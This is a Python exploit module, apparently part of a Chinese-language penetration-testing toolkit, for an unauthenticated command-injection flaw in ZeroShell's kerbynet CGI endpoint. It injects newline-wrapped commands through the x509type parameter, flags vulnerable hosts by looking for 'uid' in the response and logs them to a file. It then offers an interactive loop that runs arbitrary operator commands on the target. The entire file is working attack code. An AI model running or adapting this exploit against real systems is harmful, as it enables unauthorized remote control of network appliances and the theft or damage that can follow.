#! /usr/bin/python3
# -*- encoding: utf-8 -*-

import urllib3
import requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt

urllib3.disable_warnings()


class ZeroShellRceScan:

    def run(self, urls):
        url = urls + "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27"
        response = requests.get(url, headers=self.headers, proxies=self.proxy, verify=self.ssl)
        if "uid" in response.text:
            if not self.batch:
                OutPrintInfoSuc("ZeroShell", '存在ZeroShell命令执行')
                OutPrintInfo("ZeroShell", url)
            else:
                OutPrintInfoSuc("ZeroShell", f'存在ZeroShell命令执行 {url}')
                with open("./result/zeroshell_rce.txt","a") as w:
                    w.write(f"{url}\n")
            return True
        else:
            if not self.batch:
                OutPrintInfo("ZeroShell", '不存在ZeroShell命令执行')
            return False
    def run2(self, urls,cmd):
        url = urls + f"/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A{cmd}%0A%27"
        response = requests.get(url, headers=self.headers, proxies=self.proxy, verify=self.ssl)

        OutPrintInfo("ZeroShell", response.text)
    def main(self, target):
        self.batch = target["batch_work"]
        if not self.batch:
            OutPrintInfo("ZeroShell", '开始执行ZeroShell命令执行...')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]

        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if self.run(url):
            if not self.batch:
                choose = Prompt.ask("[b bright_cyan]是否进行漏洞利用([b bright_red]y/n[/b bright_red])")
                if choose == "y":
                    while True:
                        cmd = Prompt.ask("[b bright_red]输入需要执行到命令")
                        if cmd == "exit":
                            break
                        self.run2(url,cmd)
        if not self.batch:
            OutPrintInfo("ZeroShell", 'ZeroShell命令执行检测执行结束')